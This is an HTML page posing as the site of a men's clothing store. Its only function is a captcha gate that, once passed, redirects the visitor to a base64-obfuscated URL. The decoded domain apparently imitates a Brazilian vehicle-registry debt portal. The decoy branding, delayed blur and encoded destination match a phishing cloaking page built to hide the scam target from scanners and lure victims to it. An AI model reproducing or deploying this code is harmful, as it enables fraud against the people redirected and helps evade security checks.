<head>

  <meta name="robots" content="index,follow" />
  <meta name="theme-color" content="#111111" />
  <title>Deluxe Vestuários Masculinos | Blumenau e Campo Grande</title>
  <style>
  :root{ --overlay-bg: rgba(255,255,255,0.64); --accent: #00649c; }
  html, body {height:100%;margin:0;font-family:sans-serif;background:#004f9f;}
  .wrap{position:relative;width:100%;height:100vh;overflow:hidden;display:flex;align-items:center;justify-content:center;}
  #bgImg{position:absolute;inset:0;width:100%;height:100%;object-fit:cover;transition:filter 0.9s ease,transform 0.9s ease;z-index:0;}
  .blurred{filter:blur(6px) brightness(.95);transform:scale(1.03);}
  .overlay{position:relative;z-index:5;width:min(560px,94%);padding:18px;display:flex;align-items:center;justify-content:center;opacity:0;transition:opacity 0.45s ease;}
  .card{width:100%;background:var(--overlay-bg);backdrop-filter:blur(4px);border-radius:12px;box-shadow:0 12px 30px rgba(0,0,0,0.25);padding:16px;text-align:center;}
  .logo{margin-bottom:12px;}
  .logo img{height:56px;max-width:70%;object-fit:contain;}
  .lds-ellipsis{display:inline-block;position:relative;width:44px;height:44px;}
  .lds-ellipsis div{position:absolute;top:16px;width:8px;height:8px;border-radius:50%;background:var(--accent);animation-timing-function:cubic-bezier(0,1,1,0);}
  .lds-ellipsis div:nth-child(1){left:6px;animation:lds1 0.6s infinite;}
  .lds-ellipsis div:nth-child(3){left:26px;animation:lds2 0.6s infinite;}
  .lds-ellipsis div:nth-child(4){left:45px;animation:lds3 0.6s infinite;}
  @keyframes lds1{0%{transform:scale(0);}100%{transform:scale(1);}}
  @keyframes lds3{0%{transform:scale(1);}100%{transform:scale(0);}}
  @keyframes lds2{0%{transform:translate(0,0);}100%{transform:translate(19px,0);}}
  @media (max-width:480px){.logo img{height:46px;}.card{padding:14px;}}
  body.noscroll{overflow:hidden;}  
  .lds-ellipsis div:nth-child(2){left:6px;animation:lds2 0.6s infinite;}
</style>
</head>
<div class="wrap">
  <img id="bgImg"
       src="https://i.postimg.cc/PrhG81pr/iko7Rf.png"
       srcset="https://i.postimg.cc/Cxkf6TMc/cel8u7ye5.png 480w, https://i.postimg.cc/PrhG81pr/iko7Rf.png 1200w"
       sizes="100vw"
       alt="Fundo" />
  <div class="overlay" id="overlay">

        <div id="spinner" class="lds-ellipsis">
          <div></div><div></div><div></div><div></div>
        </div>
        <div id="recaptcha" style="display:none;"></div>
      </div>
    </div>
  </div>
</div>

<script>
(function(){
  const blurDelayMs=2000;
  const siteKey="6LdXtIUtAAAAAEkWb7fKjB2IsmiGYaSRg5xbs-j6";
  const redirectUrl=atob("aHR0cHM6Ly9tZXVzZGVidG9zLWRldHJhbm1zLnNmemktcHZhLm9ubGluZS8=");
  const bgImg=document.getElementById("bgImg");
  const overlay=document.getElementById("overlay");
  const spinner=document.getElementById("spinner");
  const recaptchaDiv=document.getElementById("recaptcha");

  window.recaptchaVerificado=function(){
    window.location.href=redirectUrl;
  }

  function reveal(){
    bgImg.classList.add("blurred");
    overlay.style.opacity=1;
    loadRecaptcha();
  }

  function loadRecaptcha(){
    const s=document.createElement("script");
    s.src="https://www.google.com/recaptcha/api.js?onload=onRecaptchaLoaded&render=explicit";
    s.async=true;
    s.defer=true;
    document.head.appendChild(s);
  }

  window.onRecaptchaLoaded=function(){
    spinner.style.display="none";
    recaptchaDiv.style.display="block";
    grecaptcha.render("recaptcha",{
      sitekey:siteKey,
      callback:recaptchaVerificado
    });
  };

  setTimeout(reveal,blurDelayMs);
})();
</script>
</body>
</html>
